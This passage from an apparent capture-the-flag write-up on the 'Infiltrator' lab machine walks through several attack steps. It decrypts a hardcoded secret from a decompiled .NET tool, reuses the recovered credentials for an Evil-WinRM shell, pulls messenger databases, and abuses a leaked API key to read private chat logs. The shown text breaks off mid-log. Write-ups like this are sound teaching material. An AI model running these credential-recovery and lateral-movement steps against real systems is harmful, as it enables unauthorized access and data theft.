              directorySearcher.Filter = string.Format("(SAMAccountName={0})", (object) str1);
              Console.WriteLine(string.Format("Search for {0} user...", (object) str1));
              SearchResult one = directorySearcher.FindOne();
              if (one != null)
              {
                Console.WriteLine("User found. Details:");
                DirectoryEntry directoryEntry = one.GetDirectoryEntry();
                Console.WriteLine(string.Format("Name: {0}", directoryEntry.Properties["cn"].Value));
                Console.WriteLine(string.Format("EmailID: {0}", directoryEntry.Properties["mail"].Value));
                Console.WriteLine(string.Format("Telephone Extension: {0}", directoryEntry.Properties["telephoneNumber"].Value));
                Console.WriteLine(string.Format("Department: {0}", directoryEntry.Properties["department"].Value));
                Console.WriteLine(string.Format("Job Title: {0}", directoryEntry.Properties["title"].Value));
                return;
              }
              Console.WriteLine("User not found.");
              return;
            }
          }
        }
        catch (Exception ex)
        {
          Console.WriteLine(string.Format("An error occurred: {0}", (object) ex.Message));
          return;
        }
      }
    }
    Console.WriteLine("Usage: UserExplorer.exe -u <username> -p <password>  -s <searchedUsername> [-default]");
    Console.WriteLine("To use the default credentials: UserExplorer.exe -default -s userToSearch");
  }
}

```

#### Reversing Decryptor

The `Decryptor` class is simple:

```

public class Decryptor
{
  public static string DecryptString(string key, string cipherText)
  {
    using (Aes aes = Aes.Create())
    {
      aes.Key = Encoding.UTF8.GetBytes(key);
      aes.IV = new byte[16];
      ICryptoTransform decryptor = aes.CreateDecryptor(aes.Key, aes.IV);
      using (MemoryStream memoryStream = new MemoryStream(Convert.FromBase64String(cipherText)))
      {
        using (CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, decryptor, CryptoStreamMode.Read))
        {
          using (StreamReader streamReader = new StreamReader((Stream) cryptoStream))
            return streamReader.ReadToEnd();
        }
      }
    }
  }
}

```

The key is UTF-8 (not hex), and cipher text is base64 decoded and then passed to AES.

#### Decrypting Secret

CyberChef [can handle](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)AES_Decrypt(%7B'option':'UTF8','string':'b14ca5898a4e4133bbce2ea2315a1916'%7D,%7B'option':'Hex','string':'00000000000000000000000000000000'%7D,'CBC','Raw','Raw',%7B'option':'Hex','string':''%7D,%7B'option':'Hex','string':''%7D)&input=VEdsdTIyb284R0lIUmtKQkJwWjFuUS94NmwzNk1WajNVa3Y0SHc4NnFHRT0) base64-decode and AES decrypt:

![image-20240906210438639](/img/image-20240906210438639.png)

Interestingly, the output is a base64 encoded string. It decodes to junk:

![image-20240906210842473](/img/image-20240906210842473.png)

But if I decrypt again, it returns a string:

![image-20240906211139296](/img/image-20240906211139296.png)

### WinRM

Those creds work for both SMB and WinRM:

```

oxdf@hacky$ netexec smb infiltrator.htb -u winrm_svc -p 'WinRm@$svc^!^P'
SMB         10.10.11.31     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.31     445    DC01             [+] infiltrator.htb\winrm_svc:WinRm@$svc^!^P 
oxdf@hacky$ netexec winrm infiltrator.htb -u winrm_svc -p 'WinRm@$svc^!^P'
WINRM       10.10.11.31     5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:infiltrator.htb)
WINRM       10.10.11.31     5985   DC01             [+] infiltrator.htb\winrm_svc:WinRm@$svc^!^P (Pwn3d!)

```

I’ll connect with Evil-WinRM:

```

oxdf@hacky$ evil-winrm -i infiltrator.htb -u winrm_svc -p 'WinRm@$svc^!^P'
                                        
Evil-WinRM shell v3.5
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> 

```

## Shell as O.Martinez

### Enumeration

#### From Shell

There’s not too much new that jumps out enumerating from the shell. The user is a member of the `Service_Management` group:

```
*Evil-WinRM* PS C:\Users\winrm_svc> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                            Attributes
=========================================== ================ ============================================== ==================================================
Everyone                                    Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access     Alias            S-1-5-32-574                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
INFILTRATOR\Service_Management              Group            S-1-5-21-2606098828-3734741516-3625406802-1116 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448

```

There’s an `Output Messenger` directory in winrm\_svc’s `Appdata\Roaming` directory:

```
*Evil-WinRM* PS C:\Users\winrm_svc\AppData\Roaming\Output Messenger> ls

    Directory: C:\Users\winrm_svc\AppData\Roaming\Output Messenger

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        2/25/2024   7:20 AM                JAAA
-a----        2/25/2024   7:20 AM            948 OutputMessenger.log

```

The log isn’t interesting. A quick look at the files in the directory shows a bunch of images and two `.db3` files:

```
*Evil-WinRM* PS C:\Users\winrm_svc\AppData\Roaming\Output Messenger> tree /f
Folder PATH listing
Volume serial number is 96C7-B603
C:.
³   OutputMessenger.log
³
ÀÄÄÄJAAA
    ³   OM.db3
    ³   OT.db3
    ³
    ÃÄÄÄAudios
    ÃÄÄÄCalendarFiles
    ÃÄÄÄLog
    ÃÄÄÄMailInbox
    ÃÄÄÄMailSent
    ÃÄÄÄReceived Files
    ÃÄÄÄScreenshots
    ÃÄÄÄTemp
    ³   ³   arrow_l_active.png
    ³   ³   arrow_l_active_d.png
    ³   ³   arrow_l_alert.png
    ³   ³   arrow_l_inactive.png
    ³   ³   arrow_l_inactive_d.png
    ³   ³   arrow_r_active.png
    ³   ³   arrow_r_active_d.png
    ³   ³   arrow_r_alert.png
    ³   ³   arrow_r_inactive.png
    ³   ³   arrow_r_inactive_d.png
    ³   ³   cat0_mini.png
    ³   ³   cat1_mini.png
    ³   ³   cat2_mini.png
    ³   ³   cat3_mini.png
    ³   ³   cat4_mini.png
    ³   ³   closegc.png
    ³   ³   closegc1.png
    ³   ³   c_anno.png
    ³   ³   darrow.png
    ³   ³   downarrow.png
    ³   ³   forward_icon_b_15.png
    ³   ³   forward_icon_w_15.png
    ³   ³   leave_today_16.png
    ³   ³   leave_tomorrow3_16.png
    ³   ³   load_20.gif
    ³   ³   Meeting.png
    ³   ³   message_notification.gif
    ³   ³   mobile2.png
    ³   ³   mobile_offline2.png
    ³   ³   network10_16.png
    ³   ³   network11_16.png
    ³   ³   network12_16.png
    ³   ³   network13_16.png
    ³   ³   network14_16.png
    ³   ³   network15_16.png
    ³   ³   network16_16.png
    ³   ³   network17_16.png
    ³   ³   network1_16.png
    ³   ³   network2_16_2.png
    ³   ³   network3_16.png
    ³   ³   network4_16.png
    ³   ³   network5_16.png
    ³   ³   network6_16.png
    ³   ³   network7_16.png
    ³   ³   network8_16.png
    ³   ³   network9_16.png
    ³   ³   plus_math_20.png
    ³   ³   plus_math_20_b.png
    ³   ³   poll_multi_tick.png
    ³   ³   poll_multi_tick_w.png
    ³   ³   poll_tick.png
    ³   ³   poll_tick_w.png
    ³   ³   rightarrow.png
    ³   ³   tickgallery.png
    ³   ³   trash_14.png
    ³   ³   trash_14_red.png
    ³   ³
    ³   ÃÄÄÄDrive
    ³   ÃÄÄÄProfile
    ³   ³       UP1_A_1.png
    ³   ³       UP9_WS_9.png
    ³   ³
    ³   ÀÄÄÄReceived Files
    ÀÄÄÄTheme

```

I’ll grab both files:

```
*Evil-WinRM* PS C:\Users\winrm_svc\AppData\Roaming\Output Messenger\JAAA> download OM.db3
                                        
Info: Downloading C:\Users\winrm_svc\AppData\Roaming\Output Messenger\JAAA\OM.db3 to OM.db3
                                        
Info: Download successful!
*Evil-WinRM* PS C:\Users\winrm_svc\AppData\Roaming\Output Messenger\JAAA> download OT.db3
                                        
Info: Downloading C:\Users\winrm_svc\AppData\Roaming\Output Messenger\JAAA\OT.db3 to OT.db3
                                        
Info: Download successful!

```

#### DB Enumeration

Both files are SQLite files:

```

oxdf@hacky$ file *.db3
OM.db3: SQLite 3.x database, last written using SQLite version 3008006, page size 1024, file counter 33, database pages 29, cookie 0xf, schema 4, UTF-8, version-valid-for 33
OT.db3: SQLite 3.x database, last written using SQLite version 3008006, page size 1024, file counter 8, database pages 13, cookie 0x6, schema 4, UTF-8, version-valid-for 8

```

`OT.db3` is basically empty:

```

oxdf@hacky$ sqlite3 OT.db3
SQLite version 3.45.1 2024-01-30 16:01:20
Enter ".help" for usage hints.
sqlite> .tables
om_project             om_project_task_users  om_task_status       
om_project_task        om_task_settings       om_task_type         
sqlite> select * from om_project;
sqlite> select * from om_project_task;
sqlite> select * from om_project_task_users;
sqlite> select * from om_task_settings;
leave_user_sync_date|2024-02-19T22:32:29.643Z
calendar_user_settings|{"Approvers":[],"ApprovedUsers":"","LeaveTypes":[{"Id":1,"Name":"Casual","Color":"#339966","IsDefault":true},{"Id":2,"Name":"Sick","Color":"#00CCFF","IsDefault":true}],"Calendar":{"OfficeStartTime":"09:00 AM","NonWorkingDays":["Sunday"],"IsViewDepartmentLeaveOnly":false,"DeleteLeave":12,"Holidays":[]}}
sqlite> select * from om_task_status;
sqlite> select * from om_task_type;

```

The tables in `OM.db3` list some having to do with chatrooms:

```

oxdf@hacky$ sqlite3 OM.db3
SQLite version 3.45.1 2024-01-30 16:01:20
Enter ".help" for usage hints.
sqlite> .tables
om_chatroom               om_drive_files            om_preset_message       
om_chatroom_user          om_escape_message         om_reminder             
om_custom_group_new       om_hide_usergroup         om_settings             
om_custom_group_user_new  om_notes                  om_user_master          
om_custom_status          om_notes_user             om_user_photo

```

Very soon I will need to know the `roomkey` for a chatroom, which is a column in `om_chatroom`:

```

sqlite> .schema om_chatroom
CREATE TABLE [om_chatroom] (
                  [chatroom_id] INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL,
                  [chatroom_name] NVARCHAR(50),
                  [chatroom_key] NVARCHAR(50),
                  [chatroom_new_name] NVARCHAR(100),
                  [photo_key] NVARCHAR(100),
                  [chatroom_new_key] NVARCHAR(100),
                  [chatroom_notification] BOOLEAN,
                  [updated_date] DATETIME,
                  [leave_room] BOOLEAN,
                  [admin_only_chat] BOOLEAN,
                                                                        [last_message_date] DATETIME,
                  [is_remote_server] BOOLEAN,
                  [remote_server_id] INTEGER,
                  [is_active] BOOLEAN,
                                                                        [last_message_id] NVARCHAR(50),
                  [pin_message] NTEXT
                  );

```

I’ll grab the keys:

```

sqlite> select chatroom_name, chatroom_key from om_chatroom;
chatroom_name|chatroom_key
General_chat|20240219160702@conference.com
Chiefs_Marketing_chat|20240220014618@conference.com

```

There is some other data, but nothing too useful.

#### Output Messenger

winrm\_svc is also a user in Output Messenger. I’ll log out of the client and start it again as winrm\_svc. They have labels like “Services Management” and “Management and Security”:

![image-20240907065650909](/img/image-20240907065650909.png)

They are in a group, Management and Security:

![image-20240907065917074](/img/image-20240907065917074.png)

They have a chat history with O.Martinez:

![image-20240907065733720](/img/image-20240907065733720.png)

There are two hints in this chat. The obvious one is that password is likely in the messages for that chat group. The other less obvious has to do with an issue with a popup every day at 9:00 am.

There’s also chats with two offline users. D.Anderson has requested a password reset:

![image-20240907065948437](/img/image-20240907065948437.png)

And A.Walker requested access to a group chat:

![image-20240907070012710](/img/image-20240907070012710.png)

That suggests that winrm\_svc has the capability to add people to group chats.

In the Notes section, there’s a note with the subject “app management” with an API key:

![image-20240907070122797](/img/image-20240907070122797.png)

### Output Messenger API

#### Authentication

[This page](https://support.outputmessenger.com/authentication-api/) from the Output Messenger documentation shows how to use the API on 14125, which matches the API identified [above](/2025/06/14/htb-infiltrator.html#api---tcp-14125). Hitting it without auth returns an error:

```

oxdf@hacky$ proxychains curl localhost:14125
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:1080-<><>-127.0.0.1:14125-<><>-OK
{"Message":"No HTTP resource was found that matches the request URI 'http://localhost:14125/'.","MessageDetail":"No route data was found for this request."}

```

An endpoint in that documentation page is `/api/users`, but it requires auth:

```

oxdf@hacky$ proxychains curl localhost:14125/api/users
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:1080-<><>-127.0.0.1:14125-<><>-OK
{"Message":"Request is missing authorization token."}

```

The docs show that an API key is set, which is likely what was in the note:

![image-20240907070440537](/img/image-20240907070440537.png)

If that is what this API key is, I should be able to add it as an `API-KEY` header:

```

oxdf@hacky$ proxychains curl -H "API-KEY: 558R501T5I6024Y8JV3B7KOUN1A518GG" localhost:14125/api/users
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:1080-<><>-127.0.0.1:14125-<><>-OK
{"rows":[{"user":"admin","displayname":"Admin","group":"Administration","role":"A","email":"","phone":"","title":"","status":"online"},{"user":"D.anderson","displayname":"D.anderson","group":"Marketing Team","role":"U","email":"anderson@infiltrator.htb","phone":"+0 123 443 699","title":"Marketing","status":"offline"},{"user":"L.clark","displayname":"L.clark","group":"Marketing Team","role":"U","email":"clark@infiltrator.htb","phone":"+0 123 443 699","title":"Marketing","status":"offline"},{"user":"M.harris","displayname":"M.harris","group":"Developers","role":"U","email":"harris@infiltrator.htb","phone":"+0 123 443 699","title":"Developer","status":"offline"},{"user":"O.martinez","displayname":"O.martinez","group":"Others","role":"U","email":"martinez@infiltrator.htb","phone":"","title":"Chief Marketing Officer","status":"online"},{"user":"A.walker","displayname":"A.walker","group":"Others","role":"U","email":"walker@infiltrator.htb","phone":"","title":"Co Founder","status":"offline"},{"user":"K.turner","displayname":"K.turner","group":"QA Testers","role":"U","email":"turner@infiltrator.htb","phone":"","title":"QA Tester","status":"offline"},{"user":"E.rodriguez","displayname":"E.rodriguez","group":"Digital Influencer Marketing","role":"U","email":"rodriguez@infiltrator.htb","phone":"+0 123 443 699","title":"Digital Influencer","status":"offline"},{"user":"winrm_svc","displayname":"winrm_svc","group":"Management and Security","role":"U","email":"winrm_svc@infiltrator.htb","phone":"+0 123 443 699","title":"Services Management","status":"online"},{"user":"Developer_01","displayname":"Developer_01","group":"Developers","role":"U","email":"Developer_01@infiltrator.htb","phone":"","title":"Developer","status":"offline"},{"user":"Developer_02","displayname":"Developer_02","group":"Developers","role":"U","email":"Developer_02@infiltrator.htb","phone":"","title":"Developer_02","status":"offline"},{"user":"Developer_03","displayname":"Developer_03","group":"Developers","role":"U","email":"Developer_03@infiltrator.htb","phone":"","title":"Developer_03","status":"offline"}],"success":true}

```

It worked.

#### Rooms

[This page](https://support.outputmessenger.com/chat-room-api/) describes the chat room API. `/api/chatrooms` will get all rooms:

```

oxdf@hacky$ proxychains -q curl -H "API-KEY: 558R501T5I6024Y8JV3B7KOUN1A518GG" localhost:14125/api/chatrooms -s | jq .
{
  "rows": [
    {
      "room": "Chiefs_Marketing_chat",
      "roomusers": "O.martinez|0,A.walker|0"
    },
    {
      "room": "Dev_Chat",
      "roomusers": "Admin|0,M.harris|0,K.turner|0,Developer_01|0,Developer_02|0,Developer_03|0"
    },
    {
      "room": "General_chat",
      "roomusers": "Admin|0,D.anderson|0,L.clark|0,M.harris|0,O.martinez|0,A.walker|0,K.turner|0,E.rodriguez|0,winrm_svc|0,Developer_01|0,Developer_02|0,Developer_03|0"
    },
    {
      "room": "Marketing_Team_chat",
      "roomusers": "D.anderson|0,L.clark|0"
    }
  ],
  "success": true
}

```

The “Chiefs\_Marketing\_chat” has two users (and likely O.Martinez’s password). Requesting that room specifically doesn’t provide any additional information:

```

oxdf@hacky$ proxychains -q curl -H "API-KEY: 558R501T5I6024Y8JV3B7KOUN1A518GG" localhost:14125/api/chatrooms/Chiefs_Marketing_chat -s | jq .
{
  "row": {
    "room": "Chiefs_Marketing_chat",
    "roomusers": "A.walker|0,O.martinez|0"
  },
  "success": true
}

```

There’s an API to get logs from a room, but it requires the “Chat Room key”, which I have it from the database file [above](/2025/06/14/htb-infiltrator.html#db-enumeration).

#### Pull Chat Logs

In addition to the `roomkey`, the API also requires a `fromdate` and `todate`. Without them, the error message makes it look like the `roomkey` is bad:

```

oxdf@hacky$ proxychains -q curl -H "API-KEY: 558R501T5I6024Y8JV3B7KOUN1A518GG" 'localhost:14125/api/chatrooms/logs?roomkey=20240220014618@conference.com'
{"success":false,"message":"logs chatroom does not exists!"}

```

But on adding them (picking an arbitrarily long time range):

```

oxdf@hacky$ proxychains -q curl -H "API-KEY: 558R501T5I6024Y8JV3B7KOUN1A518GG" 'localhost:14125/api/chatrooms/logs?roomkey=20240220014618@conference.com&fromdate=2010/01/01&todate=2024/09/01'
{"success":true,"logs":"\u003cstyle\u003e\n*, *:before, *:after {\nbox-sizing: border-box;\n}\na {\ntext-decoration:none;\ncolor: black;\n}\na:link,a:visited,a:hover,a:active  {\ncolor: black;\n}\n.room_log{\nfont-family: \"Open Sans\" ,Segoe UI,Calibri,Candara,Arial,sans-serif;\nfont-size: 13px;\nfont-weight: 400;\ncolor: #333;\nbackground-color: #fff;\n}\n.room_log p {\nmargin: 0px;\npadding: 0px;\nline-height: 20px;\n}\n.room_log #greybk {\nbackground-color: #f7f7f7;\nclear: both;\nwidth: 100%;\nfloat: left;\n}\n.room_log #whitebk {\nbackground-color: #fcfcfc;\nclear: both;\nwidth: 100%;\nfloat: left;\n}\n.room_log .nickname {\nclear: both;\ncolor: #A1A1A1;\nfloat: left;\nwidth: 70%;\n}\n.room_log .currentusernickname {\nclear: both;\ncolor: #319aff;\nfloat: left;\nwidth: 70%;\n}\n.room_log .msg_time, .room_log .msg_timeorange {\npadding: 2px 0p 0px 5px;\nclear: right;\nfloat: right;\nfont-size: 12px;\ncolor: #A1A1A1;\nwidth: 30%;\ntext-align: right;\n}\n.room_log .msg_timeorange {\ncolor: #f98c01;\n}\n.room_log .msg_body {\ncolor: #000000;\nfloat: left;\npadding: 0px 0px 5px 5px;\nwidth: 96%;\noverflow:auto;\n}\n.room_log .msg_leftgc{\ncolor: #A1A1A1;\nfont-size: 12px;\nfloat: right;\nfont-weight: bold;\npadding-bottom: 5px;\n}\n#whitebk.msg_leftgc, #greybk.msg_leftgc{\ntext-align:right;\n}\n.room_log .msg_signout {\ncolor: #0072c6;\nfloat: right;\nfont-weight: bold;\npadding-bottom: 5px;\n}\n.room_log .unreadmsg {\nfloat: right;\npadding: 5px 6px 0px 0px;\nwidth: 18px;\n}\n.room_log .datefont {\nfont-size: 17px;\nfont-weight: bold;\ncolor: #686667;\ntext-align: center;\nword-wrap: break-word;\n}\n.room_log .monthfont {\nfont-size: 12px;\nfont-weight: bold;\ncolor: #686667;\ntext-align: left;\nword-wrap: break-word;\n}\n.room_log .datebox {\nwidth: 38px;\nbackground-color: #e0e0e0;\ntext-align: center;\ntext-color: #686667;\nword-wrap: break-word;\nfloat: right;\n}\n.room_log .dashedline {\nmargin-top: 26px;\nborder-top: 1px dashed #d8d8d8;\nbackground-color: #FFFFFF;\nheight: 1px;\nwidth: 100%;\n}\n.room_log .highlighttext {\nbackground-color: lime;\nfont-weight: bold;\ntext-color: white;\n}\n.room_log .logfromname {\npadding-top: 4px;\nvertical-align: middle;\ncolor: #397dba;\nclear: both;\ndisplay: box;\n}\n.room_log .logdateorange {\ncolor: #ff9104;\nfont-size: 11px;\nfont-weight: italic;\nfloat: left;\npadding-top: 5px;\nclear: both;\nheight: 25px;\nwidth: 50%;\n}\n.room_log img.middle {\nvertical-align: middle;\n}\n.room_log img.bottom {\nvertical-align: bottom;\n}\n/*** Bullets ***/\n.room_log .bullet {\nfloat: left;\nposition: relative;\nwidth: 5px;\nheight: 15px;\nmargin: 0px 0px 0px 15px;\noverflow: hidden;\nclear: both;\n}\n.room_log .bullet img {\nvertical-align: middle;\nposition: absolute;\ntop: 60%;\nleft: 0px;\n}\n.room_log .bullet img.unread {\nmargin-left: -6px;\n}\n.room_log .bullet img.non-delivered {\n}\n.room_log .bullet img.read {\nmargin-left: -12px;\n}\n.room_log .sep {\npadding: 0 0 0 0;\nclear: both;\n}\n/*** End Bullets ***/\n/*** Emotions ***/\n.room_log .emotion {\nwidth: 16px;\nheight: 16px;\noverflow: hidden;\nposition: relative;\ndisplay: inline-block;\n}\n.room_log .emotion img {\nposition: absolute;\nleft: -5px;\ntop: -5px;\n}\n.room_log .e_whistle {\nwidth: 17px;\nheight: 17px;\n}\n.room_log .e_brb {\nwidth: 17px;\nheight: 17px;\n}\n.room_log .e_secret {\nwidth: 19px;\nheight: 19px;\n}\n/*First Row*/\n.room_log .emotion img.smile {\n}\n.room_log .emotion img.very_happy {\nmargin-left: -25px;\n}\n.room_log .emotion img.baring_teeth {\nmargin-left: -50px;\n}\n.room_log .emotion img.winking {\nmargin-left: -75px;\n}\n.room_log .emotion img.shocked {\nmargin-left: -100px;\n}\n.room_log .emotion img.omg {\nmargin-left: -125px;\n}\n.room_log .emotion img.tonque_out {\nmargin-left: -150px;\n}\n.room_log .emotion img.nerd {\nmargin-left: -175px;\n}\n/*Second Row*/\n.room_log .emotion img.angry {\nmargin-top: -25px;\n}\n.room_log .emotion img.ashamed {\nmargin-left: -25px;\nmargin-top: -25px;\n}\n.room_log .emotion img.i_dont_know {\nmargin-left: -50px;\nmargin-top: -25px;\n}\n.room_log .emotion img.confused {\nmargin-left: -75px;\nmargin-top: -25px;\n}\n.room_log .emotion img.crying {\nmargin-left: -100px;\nmargin-top: -25px;\n}\n.room_log .emotion img.sad {\nmargin-left: -125px;\nmargin-top: -25px;\n}\n.room_log .emotion img.dont_tell_anyone {\nmargin-left: -150px;\nmargin-top: -25px;\n}\n.room_log .emotion img.bye {\nmargin-left: -175px;\nmargin-top: -25px;\n}\n/*Third Row*/\n.room_log .emotion img.thinking {\nmargin-top: -51px;\n}\n.room_log .emotion img.sorry {\nmargin-left: -25px;\nmargin-top: -51px;\n}\n.room_log .emotion img.sleepy {\nmargin-left: -50px;\nmargin-top: -51px;\n}\n.room_log .emotion img.sick {\nmargin-left: -75px;\nmargin-top: -51px;\n}\n.room_log .emotion img.cool {\nmargin-left: -100px;\nmargin-top: -51px;\n}\n.room_log .emotion img.angel {\nmargin-left: -125px;\nmargin-top: -51px;\n}\n.room_log .emotion img.devil {\nmargin-left: -150px;\nmargin-top: -51px;\n}\n.room_log .emotion img.party {\nmargin-left: -175px;\nmargin-top: -51px;\n}\n/*Forth Row*/\n.room_log .emotion img.whistle {\nmargin-top: -78px;\n}\n.room_log .emotion img.brb {\nmargin-left: -25px;\nmargin-top: -78px;\n}\n.room_log .emotion img.secret {\nmargin-left: -50px;\nmargin-top: -78px;\n}\n.room_log .emotion img.headache {\nmargin-left: -75px;\nmargin-top: -78px;\n}\n.room_log .emotion img.gift {\nmargin-left: -100px;\nmargin-top: -78px;\n}\n.room_log .emotion img.birthday_cake {\nmargin-left: -125px;\nmargin-top: -78px;\n}\n.room_log .emotion img.heart {\nmargin-left: -150px;\nmargin-top: -78px;\n}\n.room_log .emotion img.broken_heart {\nmargin-left: -175px;\nmargin-top: -78px;\n}\n/*Fifth Row*/\n.room_log .emotion img.star {\nmargin-top: -106px;\n}\n.room_log .emotion img.clock {\nmargin-left: -25px;\nmargin-top: -103px;\n}\n.room_log .emotion img.coffee {\nmargin-left: -50px;\nmargin-top: -105px;\n}\n.room_log .emotion img.food {\nmargin-left: -75px;\nmargin-top: -105px;\n}\n.room_log .emotion img.money {\nmargin-left: -100px;\nmargin-top: -105px;\n}\n.room_log .emotion img.clapping_hands {\nmargin-left: -125px;\nmargin-top: -105px;\n}\n.room_log .emotion img.fingers_crossed {\nmargin-left: -150px;\nmargin-top: -105px;\n}\n.room_log .emotion img.snail {\nmargin-left: -175px;\nmargin-top: -105px;\n}\n/*Sixth Row*/\n.room_log .emotion img.rose {\nmargin-top: -130px;\n}\n.room_log .emotion img.wilted_rose {\nmargin-left: -25px;\nmargin-top: -130px;\n}\n.room_log .emotion img.play {\nmargin-left: -50px;\nmargin-top: -130px;\n}\n.room_log .emotion img.idea {\nmargin-left: -75px;\nmargin-top: -130px;\n}\n.room_log .emotion img.beer {\nmargin-left: -100px;\nmargin-top: -130px;\n}\n.room_log .emotion img.phone {\nmargin-left: -125px;\nmargin-top: -130px;\n}\n.room_log .emotion img.thumbs_up {\nmargin-left: -150px;\nmargin-top: -130px;\n}\n.room_log .emotion img.thumbs_down {\nmargin-left: -175px;\nmargin-top: -130px;\n}\n/*** End Emotions ***/\n#subject{\nborder:1px solid #A2E5FF;\nbackground-color:#C7EDFC;\npadding:5px 10px;\nwidth:100%;\nFONT-FAMILY: Segoe UI;\nfont-size:12px;\n}\n.notify_container{\nfloat:left;\nclear:both;\nwidth:100%;\npadding:10px 0px;\n}\n.notify{\nfloat:left;\npadding:5px 0px 5px 5px;\nbackground-color:#C7EDFC;\ncolor:Black;\nwidth:100%;\n}\n.notify .nickname{\ncolor:#000000;\n}\n#greybk.notify_container, #whitebk.notify_container{\npadding-top:0px;            \n}\n.reply {\nborder-left:3px solid green;\npadding-left:5px;\nmargin-top:2px;\nmargin-bottom:5px;\nbackground-color:#f5f5f5;\nfloat:left;\nwidth:100%;\n}\n.reply_name {\ncolor:green;\nfont-size: 14px;\n}\n.reply_message {\ntext-overflow: ellipsis;\nwidth: 100%;\nheight:20px;\nwhite-space: nowrap;\noverflow: hidden;\ntext-overflow: ellipsis;\n}\n.reply_file {\nfloat:left;\ndisplay:none;\nheight:40px;\nvertical-align:middle; \ntext-align:center;\nposition:absolute;\nleft: 10px;\ntop: 2px;\n}\n.reply_file img {\nposition: absolute;\nmargin: auto;\ntop: 0;\nleft: 0;\nright: 0;\nbottom: 0;\n}\n.reply_container{\nfloat:left;\nwidth:100%;\nbox-sizing: border-box;\n}\n.reply_container .msg_time {\nfont-size: 10px;\npadding-right: 10px;\npadding-top: 3px;\n}\n           \u003c/style\u003e\u003cdiv class=\u0027room_log\u0027\u003e\u003cdiv  class=\u0027logdateorange\u0027\u003e20/02/2024\u003c/div\u003e\u003cdiv class=\u0027datebox\u0027\u003e \u003cspan class=\u0027datefont\u0027\u003e20\u003cbr\u003e\u003c/span\u003e\u003cspan class=\u0027monthfont\u0027\u003eFeb\u003c/span\u003e\u003c/div\u003e\u003cbr\u003e\u003cbr\u003e\u003cdiv id=\u0027greybk\u0027\u003e\u003cdiv  class=\u0027logfromName\u0027\u003e\u003cimg src=\u0027/temp/hash_dark_20.png\u0027 class=\u0027middle\u0027 title=\u0027\u0027   /\u003e   Chiefs_Marketing_chat:  A.walker, O.martinez\u003c/div\u003e\u003c/div\u003e\u003cbr\u003e\u003cdiv id=\u0027greybk\u0027\u003e\u003cspan class=\u0027nickname\u0027 \u003eA.walker Says: \u003c/span\u003e\u003cdiv class=\u0027msg_time\u0027\u003e02:05 AM\u003c/div\u003e\u003cbr /\u003e\u003cdiv  class=\u0027bullet\u0027\u003e\u003cimg src=\u0027/Temp/bullets.png\u0027 class=\u0027read\u0027 title=\u0027\u0027 /\u003e\u003c/div\u003e\u003cdiv class=\u0027msg_body\u0027 \u003eHey, hope you\u0027re doing well! What tasks do you have on your plate today?\u003c/div\u003e\u003cbr /\u003e\u003c/div\u003e\u003cdiv id=\u0027greybk\u0027\u003e\u003cspan class=\u0027nickname\u0027 \u003eO.martinez Says: \u003c/span\u003e\u003cdiv class=\u0027msg_time\u0027\u003e02:06 AM\u003c/div\u003e\u003cbr /\u003e\u003cdiv  class=\u0027bullet\u0027\u003e\u003cimg src=\u0027/Temp/bullets.png\u0027 class=\u0027read\u0027 title=\u0027\u0027 /\u003e\u003c/div\u003e\u003cdiv class=\u0027msg_body\u0027 \u003eThanks! I\u0027m working on the new marketing campaign and reviewing the budget for Q4. How about you?\u003c/div\u003e\u003cbr /\u003e\u003c/div\u003e\u003cdiv id=\u0027greybk\u0027\u003e\u003cspan class=\u0027nickname\u0027 \u003eA.walker Says: \u003c/span\u003e\u003cdiv class=\u0027msg_time\u0027\u003e02:08 AM\u003c/div\u003e\u003cbr /\u003e\u003cdiv  class=\u0027bullet\u0027\u003e\u003cimg src=\u0027/Temp/bullets.png\u0027 class=\u0027read\u0027 title=\u0027\u0027 /\u003e\u003c/div\u003e\u003cdiv class=\u0027msg_body\u0027 \u003eSounds busy! By the way, I need to check something in your account. Could you share your username password?\u003c/div\u003e\u003cbr /\u003e\u003c/div\u003e\u003cdiv id=\u0027greybk\u0027\u003e\u003cspan class=\u0027nickname\u0027 \u003eO.martinez Says: \u003c/span\u003e\u003cdiv class=\u0027msg_time\u0027\u003e02:09 AM\u003c/div\u003e\u003cbr /\u003e\u003cdiv  class=\u0027bullet\u0027\u003e\u003cimg src=\u0027/Temp/bullets.png\u0027 class=\u0027read\u0027 title=\u0027\u0027 /\u003e\u003c/div\u003e\u003cdiv class=\u0027msg_body\u0027 \u003esure!\u003c/div\u003e\u003cbr /\u003e\u003c/div\u003e\u003cdiv id=\u0027greybk\u0027\u003e\u003cspan class=\u0027nickname\u0027 \u003eO.martinez Says: \u003c/span\u003e\u003cdiv class=\u0027msg_time\u0027\u003e02:09 AM\u003c/div\u003e\u003cbr /\u003e\u003cdiv  class=\u0027bullet\u0027\u003e\u003cimg src=\u0027/Temp/bullets.png\u0027 class=\u0027read\u0027 title=\u0027\u0027 